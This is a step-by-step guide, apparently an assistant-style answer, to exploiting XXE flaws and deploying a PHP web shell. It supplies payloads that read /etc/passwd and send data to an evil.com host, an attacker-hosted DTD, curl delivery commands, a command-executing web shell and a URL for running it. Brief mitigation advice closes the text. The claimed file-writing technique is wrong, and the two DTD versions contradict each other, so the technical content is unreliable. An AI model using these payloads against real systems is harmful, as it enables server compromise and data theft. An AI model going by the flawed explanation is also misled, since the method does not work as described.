Creating a remote shell using an XXE (XML External Entity) vulnerability typically involves exploiting the ability to read or write files on the server. Here’s a step-by-step guide to exploiting an XXE vulnerability to deploy a web shell:

### Step-by-Step Exploit to Deploy a Web Shell

#### 1. Identify the XXE Vulnerability

First, test if the application is vulnerable by sending XML data that attempts to access a local file or an external entity.

#### 2. Craft a Malicious XML Payload

Create an XML payload that attempts to read or write files on the server. For deploying a web shell, you need the server to write a file into the web directory.

### Example Payloads

#### Basic XXE Payload to Read Local Files

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

#### XXE Payload to Send File Contents to a Remote Server

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://evil.com/?data=file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

#### XXE Payload to Write a Web Shell

If the server is configured to allow the writing of files, you can attempt to write a web shell to the server’s web directory. Here is an example of doing that in a PHP environment.

### External DTD to Write a Web Shell

Create an external DTD file (`external.dtd`) hosted on a server you control. This DTD will write a simple PHP web shell to the server.

#### `external.dtd` Content

```xml
<!ENTITY % file SYSTEM "file:///var/www/html/shell.php">
<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://evil.com/?content=%file;'>">
%eval;
%exfil;
```

### Malicious XML Payload to Trigger the DTD

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://evil.com/external.dtd">
  %dtd;
]>
<foo>&exfil;</foo>
```

### Steps to Deploy the Web Shell

1. **Host the DTD File**: Host the `external.dtd` on a server you control (e.g., `http://evil.com/external.dtd`).

2. **Send the Malicious XML Payload**: Send the malicious XML payload to the vulnerable application. Use a tool like `curl` to send the payload:

   ```bash
   curl -X POST -d @payload.xml http://example.com/upload
   ```

3. **Access the Web Shell**: Once the web shell is written to the server, you can access it via a web browser and execute commands. For example, navigate to:

   ```http
   http://example.com/shell.php?cmd=whoami
   ```

### Example Web Shell in PHP

The PHP web shell allows executing commands on the server:

```php
<?php system($_GET['cmd']); ?>
```

### Practical Example

1. **Craft the Payload to Write the Web Shell**:

   `payload.xml`:

   ```xml
   <?xml version="1.0" encoding="ISO-8859-1"?>
   <!DOCTYPE foo [
     <!ENTITY % dtd SYSTEM "http://evil.com/external.dtd">
     %dtd;
   ]>
   <foo>&exfil;</foo>
   ```

2. **Host the DTD File**:

   `external.dtd`:

   ```xml
   <!ENTITY % file "<!ENTITY exfil SYSTEM 'file:///var/www/html/shell.php'>">
   ```

3. **Send the Malicious XML Payload**:

   ```bash
   curl -X POST -d @payload.xml http://example.com/upload
   ```

4. **Access the Web Shell**:

   ```http
   http://example.com/shell.php?cmd=whoami
   ```

### Mitigation Strategies

1. **Disable External Entities**:
   - Configure your XML parser to disable external entities.

2. **Use Secure Parsers**:
   - Use libraries and parsers that are configured securely by default.

3. **Input Validation**:
   - Validate and sanitize all user inputs, including XML.

4. **Patch and Update**:
   - Keep your software and libraries updated with the latest security patches.

### Example Mitigation in Java

If you're using Java, disable external entities:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

### Conclusion

XXE vulnerabilities can be exploited to deploy a remote web shell if the server processes external entities and allows file operations. Proper input validation, disabling external entities, and keeping software up-to-date are crucial steps to prevent these vulnerabilities. Always test and validate the security of your XML parsing logic.
